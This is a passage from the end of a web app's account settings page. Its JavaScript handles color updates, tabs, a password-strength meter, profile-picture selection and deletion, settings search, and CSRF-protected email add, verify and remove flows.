            .then(response => response.text())
            .then(text => {
                const appearanceTab = document.querySelector('#appearance .settings-body'); 
                const existingMessage = appearanceTab.querySelector('.alert'); 
                if (existingMessage) existingMessage.remove();

                const messageDiv = document.createElement('div');
                messageDiv.className = text.includes("successfully") ? 'alert alert-success' : 'alert alert-danger';
                messageDiv.textContent = text.includes("successfully") ? "Color updated successfully!" : "Failed to update color. Please try again.";
                appearanceTab.prepend(messageDiv); 

                if (text.includes("successfully")) {
                    setTimeout(() => window.location.reload(), 2000); 
                }
            })
            .catch(error => {
                const appearanceTab = document.querySelector('#appearance .settings-body');
                const existingMessage = appearanceTab.querySelector('.alert'); 
                if (existingMessage) existingMessage.remove();

                const errorDiv = document.createElement('div');
                errorDiv.className = 'alert alert-danger';
                errorDiv.textContent = "An error occurred. Please try again.";
                appearanceTab.prepend(errorDiv);
            });
        });


        var triggerTabList = [].slice.call(document.querySelectorAll('#settings-tabs .nav-link'));
        triggerTabList.forEach(function(triggerEl) {
            triggerEl.addEventListener('click', function (e) {
                e.preventDefault();
                var tabTrigger = new bootstrap.Tab(triggerEl);
                tabTrigger.show();
            });
        });

        const newPasswordInput = document.getElementById('newPassword');
        const bars = [
            document.getElementById('bar1'),
            document.getElementById('bar2'),
            document.getElementById('bar3')
        ];
        const strengthText = document.getElementById('password-strength-text');

        if (newPasswordInput && bars.length && strengthText) {
            newPasswordInput.addEventListener('input', function() {
                const strength = calculatePasswordStrength(newPasswordInput.value);
                updateStrengthBars(strength.score);
                updateStrengthText(strength.score);
            });
        }

        function calculatePasswordStrength(password) {
            let score = 0;
            if (password.length >= 8) score++;
            if (/[A-Z]/.test(password)) score++;
            if (/[0-9]/.test(password) || /[^A-Za-z0-9]/.test(password)) score++;
            return { score };
        }

        function updateStrengthBars(score) {
            bars.forEach((bar, index) => {
                bar.className = 'password-strength-bar'; 
                if (index < score) {
                    bar.classList.add('active');
                    if (score === 1) {
                        bar.classList.add('weak');
                    } else if (score === 2) {
                        bar.classList.add('moderate');
                    } else if (score === 3) {
                        bar.classList.add('strong');
                    }
                }
            });
        }

        function updateStrengthText(score) {
            if (score === 1) {
                strengthText.textContent = 'Weak';
                strengthText.style.color = 'red';
            } else if (score === 2) {
                strengthText.textContent = 'Moderate';
                strengthText.style.color = 'orange';
            } else if (score === 3) {
                strengthText.textContent = 'Strong';
                strengthText.style.color = 'green';
            } else {
                strengthText.textContent = 'Enter a password';
                strengthText.style.color = '#888';
            }
        }

        document.querySelectorAll('.recent-pfp-thumb').forEach(function(thumb) {
            const pfpId = thumb.getAttribute('data-pfp-id');
            thumb.addEventListener('click', function(e) {
                if (e.target.closest('.recent-pfp-delete')) return;
                fetch('settings.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: `action=equip&pfp_id=${encodeURIComponent(pfpId)}&csrf_token=<?= htmlspecialchars($_SESSION['csrf_token']) ?>`
                })
                .then(res => res.json())
                .then(data => {
                    if (data.status === 'success') {
                        document.querySelector('.profile-image').src = data.file_path;
                        setTimeout(() => window.location.reload(), 500);
                    } else {
                        alert(data.msg || 'Failed to equip profile picture.');
                    }
                });
            });
            thumb.querySelector('.recent-pfp-delete').addEventListener('click', function(e) {
                e.stopPropagation();
                if (!confirm('Delete this profile picture?')) return;
                fetch('settings.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: `action=delete&pfp_id=${encodeURIComponent(pfpId)}&csrf_token=<?= htmlspecialchars($_SESSION['csrf_token']) ?>`
                })
                .then(res => res.json())
                .then(data => {
                    if (data.status === 'success') {
                        thumb.remove();
                    } else {
                        alert(data.msg || 'Failed to delete profile picture.');
                    }
                });
            });
        });

        const searchInput = document.getElementById('settings-search');
        if (searchInput) {
            searchInput.addEventListener('input', function() {
                const query = this.value.toLowerCase();
                document.querySelectorAll('.settings-card').forEach(card => {
                    const text = card.textContent.toLowerCase();
                    card.style.display = text.includes(query) ? '' : 'none';
                });
            });
        }

        var tooltipTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="tooltip"]'));
        tooltipTriggerList.forEach(function (tooltipTriggerEl) {
            new bootstrap.Tooltip(tooltipTriggerEl);
        });

        const addEmailBtn = document.getElementById('add-email-btn');
        const removeEmailBtn = document.getElementById('remove-email-btn');
        const addEmailModal = new bootstrap.Modal(document.getElementById('addEmailModal'));
        const verifyEmailModal = new bootstrap.Modal(document.getElementById('verifyEmailModal'));
        const removeEmailModal = new bootstrap.Modal(document.getElementById('removeEmailModal'));
        const addEmailForm = document.getElementById('add-email-form');
        const verifyEmailForm = document.getElementById('verify-email-form');
        const removeEmailForm = document.getElementById('remove-email-form');
        const addEmailMsg = document.getElementById('add-email-msg');
        const verifyEmailMsg = document.getElementById('verify-email-msg');
        const removeEmailMsg = document.getElementById('remove-email-msg');
        const userEmailInput = document.getElementById('user_email');

        if (addEmailBtn) {
            addEmailBtn.addEventListener('click', function() {
                addEmailMsg.textContent = '';
                addEmailForm.reset();
                addEmailModal.show();
            });
        }
        if (removeEmailBtn) {
            removeEmailBtn.addEventListener('click', function() {
                fetch('settings.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: `start_remove_email=1&csrf_token=<?= htmlspecialchars($_SESSION['csrf_token']) ?>`
                })
                .then(res => res.json())
                .then(data => {
                    if (data.status === 'ok') {
                        removeEmailMsg.textContent = '';
                        removeEmailForm.reset();
                        removeEmailModal.show();
                    } else {
                        alert(data.message || 'Failed to send removal code.');
                    }
                });
            });
        }
        if (addEmailForm) {
            addEmailForm.addEventListener('submit', function(e) {
                e.preventDefault();
                addEmailMsg.textContent = '';
                const formData = new FormData(addEmailForm);
                formData.append('start_add_email', 1);
                fetch('settings.php', {
                    method: 'POST',
                    body: formData
                })
                .then(res => res.json())
                .then(data => {
                    if (data.status === 'ok') {
                        addEmailModal.hide();
                        verifyEmailMsg.textContent = '';
                        verifyEmailForm.reset();
                        verifyEmailModal.show();
                    } else {
                        addEmailMsg.textContent = data.message || 'Failed to send verification code.';
                        addEmailMsg.className = 'alert alert-danger mt-2';
                    }
                });
            });
        }
        if (verifyEmailForm) {
            verifyEmailForm.addEventListener('submit', function(e) {
                e.preventDefault();
                verifyEmailMsg.textContent = '';
                const formData = new FormData(verifyEmailForm);
                formData.append('verify_email_code', 1);
                fetch('settings.php', {
                    method: 'POST',
                    body: formData
                })
                .then(res => res.json())
                .then(data => {
                    if (data.status === 'ok') {
                        verifyEmailMsg.className = 'alert alert-success mt-2';
                        verifyEmailMsg.textContent = 'Email verified and added!';
                        setTimeout(() => { verifyEmailModal.hide(); window.location.reload(); }, 1200);
                    } else {
                        verifyEmailMsg.className = 'alert alert-danger mt-2';
                        verifyEmailMsg.textContent = data.message || 'Verification failed.';
                    }
                });
            });
        }
        if (removeEmailForm) {
            removeEmailForm.addEventListener('submit', function(e) {
                e.preventDefault();
                removeEmailMsg.textContent = '';
                const formData = new FormData(removeEmailForm);
                formData.append('verify_remove_email_code', 1);
                fetch('settings.php', {
                    method: 'POST',
                    body: formData
                })
                .then(res => res.json())
                .then(data => {
                    if (data.status === 'ok') {
                        removeEmailMsg.className = 'alert alert-success mt-2';
                        removeEmailMsg.textContent = 'Email removed!';
                        setTimeout(() => { removeEmailModal.hide(); window.location.reload(); }, 1200);
                    } else {
                        removeEmailMsg.className = 'alert alert-danger mt-2';
                        removeEmailMsg.textContent = data.message || 'Verification failed.';
                    }
                });
            });
        }

    });
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>

</body>
</html>